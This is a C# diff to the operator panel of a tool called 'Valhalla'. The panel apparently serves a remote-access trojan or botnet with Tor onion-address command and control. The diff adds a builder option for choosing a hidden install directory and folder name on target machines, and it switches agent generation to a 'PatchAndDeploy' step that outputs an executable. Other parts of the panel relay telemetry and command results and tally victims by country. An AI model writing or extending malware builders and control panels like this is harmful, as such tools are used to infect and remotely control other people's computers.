@@ -127,6 +127,12 @@ namespace Valhalla
         private RelayGatewayClient relayGatewayClient;
         private RelaySettings relaySettings;
         private volatile bool relayConnecting;
+
+        // Builder install-directory toggle group (Change 2).
+        // _installDirButtons[i] corresponds to InstallDirectory enum value i.
+        private System.Windows.Forms.Button[] _installDirButtons;
+        private System.Windows.Forms.TextBox _folderNameBox;
+        private int _selectedInstallDir = 1; // default: AppData\Local
         private DevExpress.XtraEditors.TextEdit relayAddressEditor;
         private DevExpress.XtraEditors.TextEdit relayPortEditor;
         private DevExpress.XtraEditors.TextEdit relayPanelIdEditor;
@@ -290,6 +296,7 @@ namespace Valhalla
             relayGatewayClient.TelemetryReceived += RelayGatewayTelemetryReceived;
             relayGatewayClient.CommandResultReceived += RelayGatewayCommandResultReceived;
             relayGatewayClient.Disconnected += RelayGatewayDisconnected;
+            relayGatewayClient.OnionAddressReceived += RelayGatewayOnionAddressReceived;
             relaySettings = RelaySettingsStore.Load();
         }
 
@@ -647,6 +654,30 @@ namespace Valhalla
                 UpdateCountryStats();
                 SetRelayStatus("Relay: Disconnected" + (string.IsNullOrWhiteSpace(reason) ? string.Empty : " (" + reason + ")"), Color.FromArgb(180, 180, 180));
                 LogServerEvent("Relay disconnected: " + (reason ?? "unknown reason"), LogType.Warning);
+            };
+            try
+            {
+                if (InvokeRequired) BeginInvoke(action); else action();
+            }
+            catch (ObjectDisposedException) { }
+            catch (InvalidOperationException) { }
+        }
+
+        private void RelayGatewayOnionAddressReceived(string onionAddress)
+        {
+            // Fired on the relay reader thread; marshal to UI thread.
+            Action action = delegate
+            {
+                // Write to the onion address field in the builder panel.
+                if (textEdit4 != null)
+                    textEdit4.EditValue = onionAddress;
+
+                // Persist so the value survives panel restarts.
+                if (relaySettings != null)
+                {
+                    relaySettings.OnionAddress = onionAddress;
+                    try { RelaySettingsStore.Save(relaySettings); } catch { }
+                }
             };
             try
             {
@@ -3601,23 +3632,144 @@ namespace Valhalla
 
         private void ConfigureAgentBuildUi()
         {
-            // The previous builder exposed options that belonged to the removed Cecil
-            // injection stub and did not correspond to the Rust agent. Keep the existing
-            // panel surface but expose only the real, supported endpoint/build contract.
+            // Hide legacy stub controls that no longer apply to the Rust agent.
             checkEdit1.Visible = false;
             checkEdit2.Visible = false;
             checkEdit3.Visible = false;
             checkEdit4.Visible = false;
-            textEdit5.Visible = false;
+            textEdit5.Visible  = false;
+            label53.Visible    = false;
+            textEdit3.Visible  = false;
+            OpenFileDialogIcon = string.Empty;
 
+            // Configure the existing onion address field.
             label54.Text = "Onion Address";
             textEdit4.Properties.AllowFocused = true;
             textEdit4.EditValue = relaySettings != null && !string.IsNullOrWhiteSpace(relaySettings.OnionAddress)
                 ? relaySettings.OnionAddress
                 : string.Empty;
-            label53.Visible = false;
-            textEdit3.Visible = false;
-            OpenFileDialogIcon = string.Empty;
+
+            // Restore persisted install-dir and folder-name values.
+            if (relaySettings != null)
+            {
+                _selectedInstallDir = relaySettings.InstallDirectory;
+                if (_selectedInstallDir < 0 || _selectedInstallDir > 4) _selectedInstallDir = 1;
+            }
+
+            // ── Install Directory toggle group ──────────────────────────────
+            // Placed directly above the BUILD button inside panelControl19.
+            // Uses the same visual design as the Notifications pill toggles.
+            var installDirLabel = new System.Windows.Forms.Label
+            {
+                AutoSize  = true,
+                Text      = "Install Directory",
+                Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
+                ForeColor = Color.FromArgb(160, 160, 160),
+                BackColor = Color.Transparent,
+            };
+
+            string[] dirNames = { @"AppData\Roaming", @"AppData\Local", "Temp", "Program Files", "ProgramData" };
+            _installDirButtons = new System.Windows.Forms.Button[dirNames.Length];
+
+            var toggleRow = new System.Windows.Forms.FlowLayoutPanel
+            {
+                AutoSize     = true,
+                FlowDirection = System.Windows.Forms.FlowDirection.LeftToRight,
+                WrapContents = false,
+                BackColor    = Color.Transparent,
+            };
+
+            for (int i = 0; i < dirNames.Length; i++)
+            {
+                int capturedIndex = i;
+                var btn = new System.Windows.Forms.Button
+                {
+                    Text      = dirNames[i],
+                    AutoSize  = false,
+                    Height    = 28,
+                    Width     = 108,
+                    FlatStyle = FlatStyle.Flat,
+                    Cursor    = Cursors.Hand,
+                    Font      = new Font("Segoe UI Semibold", 8F, FontStyle.Bold, GraphicsUnit.Point),
+                    Margin    = new Padding(0, 0, 6, 0),
+                    UseVisualStyleBackColor = false,
+                };
+                btn.FlatAppearance.BorderSize  = 1;
+                btn.FlatAppearance.BorderColor = Color.FromArgb(68, 68, 68);
+                UpdateInstallDirButtonStyle(btn, i == _selectedInstallDir);
+                btn.Click += (s, e) =>
+                {
+                    _selectedInstallDir = capturedIndex;
+                    for (int j = 0; j < _installDirButtons.Length; j++)
+                        UpdateInstallDirButtonStyle(_installDirButtons[j], j == _selectedInstallDir);
+                    if (relaySettings != null)
+                    {
+                        relaySettings.InstallDirectory = _selectedInstallDir;
+                        try { RelaySettingsStore.Save(relaySettings); } catch { }
+                    }
+                };
+                _installDirButtons[i] = btn;
+                toggleRow.Controls.Add(btn);
+            }
+
+            // ── Folder Name text field ───────────────────────────────────────
+            var folderLabel = new System.Windows.Forms.Label
+            {
+                AutoSize  = true,
+                Text      = "Folder Name",
+                Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
+                ForeColor = Color.FromArgb(160, 160, 160),
+                BackColor = Color.Transparent,
+            };
+
+            _folderNameBox = new System.Windows.Forms.TextBox
+            {
+                Width     = 200,
+                Height    = 24,
+                Text      = relaySettings != null && !string.IsNullOrWhiteSpace(relaySettings.FolderName)
+                                ? relaySettings.FolderName
+                                : "Valhalla",
+                Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
+                ForeColor = Color.White,
+                BackColor = Color.FromArgb(58, 58, 58),
+                BorderStyle = BorderStyle.FixedSingle,
+            };
+            _folderNameBox.TextChanged += (s, e) =>
+            {
+                if (relaySettings != null)
+                {
+                    relaySettings.FolderName = _folderNameBox.Text;
+                    try { RelaySettingsStore.Save(relaySettings); } catch { }
+                }
+            };
+
+            // ── Combine into a container panel and inject into panelControl19 ─
+            var configContainer = new System.Windows.Forms.Panel
+            {
+                Dock      = DockStyle.Bottom,
+                Height    = 72,
+                BackColor = Color.Transparent,
+                Padding   = new Padding(0, 4, 0, 0),
+            };
+
+            installDirLabel.Location = new Point(0, 4);
+            toggleRow.Location       = new Point(0, 24);
+            folderLabel.Location     = new Point(562, 4);
+            _folderNameBox.Location  = new Point(562, 22);
+
+            configContainer.Controls.Add(installDirLabel);
+            configContainer.Controls.Add(toggleRow);
+            configContainer.Controls.Add(folderLabel);
+            configContainer.Controls.Add(_folderNameBox);
+
+            panelControl19.Controls.Add(configContainer);
+        }
+
+        private static void UpdateInstallDirButtonStyle(System.Windows.Forms.Button btn, bool selected)
+        {
+            btn.BackColor = selected ? UiTheme.AccentColor          : Color.FromArgb(58, 58, 58);
+            btn.ForeColor = selected ? Color.Black                   : Color.FromArgb(160, 160, 160);
+            btn.FlatAppearance.BorderColor = selected ? UiTheme.AccentColor : Color.FromArgb(68, 68, 68);
         }
 
         private void ApplyValhallaApplicationIcon()
@@ -3663,42 +3815,48 @@ namespace Valhalla
             }
             catch (Exception ex)
             {
-                AppendColoredText(richTextBox2, "\nBUILD FAILED: " + ex.Message + "\n", Color.Red);
                 MessageBox.Show(this, ex.Message, "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 return;
             }
 
-            string outputPath = Path.Combine(
-                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
-                RandomStringGenerator.Generate(16) + ".bin");
+            int    installDir  = _selectedInstallDir;
+            string folderName  = (_folderNameBox != null ? _folderNameBox.Text : null) ?? "Valhalla";
+            if (string.IsNullOrWhiteSpace(folderName)) folderName = "Valhalla";
+
+            // Show a Save File dialog so the operator chooses the output name and location.
+            string outputPath;
+            using (var sfd = new System.Windows.Forms.SaveFileDialog
+            {
+                Title            = "Save Valhalla Agent",
+                Filter           = "Executable (*.exe)|*.exe",
+                DefaultExt       = "exe",
+                FileName         = "agent.exe",
+                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
+            })
+            {
+                if (sfd.ShowDialog(this) != System.Windows.Forms.DialogResult.OK)
+                    return;
+                outputPath = sfd.FileName;
+            }
+
             simpleButton6.Enabled = false;
             richTextBox2.Clear();
-            AppendColoredText(richTextBox2, "VALHALLA AGENT BUILD\n", SidebarAccentColor);
-            AppendColoredText(richTextBox2, "Endpoint stub: " + onion + "\n", Color.White);
-            AppendColoredText(richTextBox2, "Compiling the Rust agent without endpoint command-line configuration…\n", Color.Yellow);
 
             try
             {
-                AgentBuildResult result = await Task.Run(() => AgentBuildService.Build(onion, outputPath));
-                AppendColoredText(richTextBox2, "\nBUILD SUCCESSFUL\n", SidebarAccentColor);
-                AppendColoredText(richTextBox2, "Agent: " + result.OutputPath + "\n", Color.White);
-                AppendColoredText(richTextBox2, "Stub:  " + result.StubPath + "\n", Color.White);
-                if (!string.IsNullOrWhiteSpace(result.BuildOutput))
-                    AppendColoredText(richTextBox2, result.BuildOutput.Trim() + "\n", Color.Gray);
+                await Task.Run(() => AgentBuildService.PatchAndDeploy(onion, installDir, folderName, outputPath));
 
                 if (relaySettings == null) relaySettings = RelaySettingsStore.Load();
-                relaySettings.OnionAddress = onion;
+                relaySettings.OnionAddress    = onion;
+                relaySettings.InstallDirectory = installDir;
+                relaySettings.FolderName       = folderName;
                 RelaySettingsStore.Save(relaySettings);
-                output = result.OutputPath;
 
-                MessageBox.Show(this,
-                    "Build completed successfully.\n\nAgent: " + result.OutputPath + "\nStub: " + result.StubPath,
-                    "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show(this, "Build complete.", "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             catch (Exception ex)
             {
-                AppendColoredText(richTextBox2, "\nBUILD FAILED\n" + ex.Message + "\n", Color.Red);
-                MessageBox.Show(this, "Build failed: " + ex.Message, "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(this, ex.Message, "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
             finally
             {
